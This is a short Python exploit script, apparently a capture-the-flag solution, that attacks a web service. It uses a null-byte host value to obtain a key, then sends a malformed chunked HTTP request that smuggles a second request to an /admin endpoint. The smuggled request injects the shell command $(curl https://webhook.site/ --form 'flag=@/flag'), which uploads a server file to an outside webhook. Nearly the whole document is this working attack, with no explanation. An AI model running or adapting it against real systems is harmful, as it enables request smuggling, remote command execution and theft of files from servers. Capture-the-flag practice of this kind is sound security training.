#!/usr/bin/env python3

import requests
import socket

# ./exp.py

host = ""
port = "5487"


site = f"http://{host}:{port}/hello-from-the-world/get_hello"

data = {
    "host": "http://127.0.0.1\0"
}

r = requests.post(site, data=data)
key = r.text
print(f"Get key: {key}")

def h(n):
    return hex(n)[2:].encode()

command = "curl https://webhook.site/ --form 'flag=@/flag'"
smuggled_data = f'{{"service":["$({command})"], "key":"{key}"}}'.encode()

smuggled_data_length = h(len(smuggled_data))

smuggled = (
    b"POST /admin HTTP/1.1\r\n" +
    f"Host: {host}:{port}\r\n".encode() +
    b"Transfer-Encoding: chunked\r\n" +
    b"\r\n" +
    smuggled_data_length + b"\r\n" +
    smuggled_data + b"\r\n" +
    b"0\r\n" + 
    b"\r\n"
)

smuggled_len = h(len(smuggled) - 7 + 5)

first_chunk_len = h(len(smuggled_len))

payload = (
    b"GET /service-info/ HTTP/1.1\r\n" +
    f"Host: {host}:{port}\r\n".encode() +
    b"Transfer-Encoding: chunked\r\n" +
    b"\r\n" +
    first_chunk_len + b" \n" + b"x"*len(smuggled_len) + b"\r\n" +
    smuggled_len + b"\r\n" +
    b"0\r\n" +
    b"\r\n" +
    smuggled
)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, int(port)))
    s.sendall(payload)
    data = s.recv(1024).decode()

print(data)
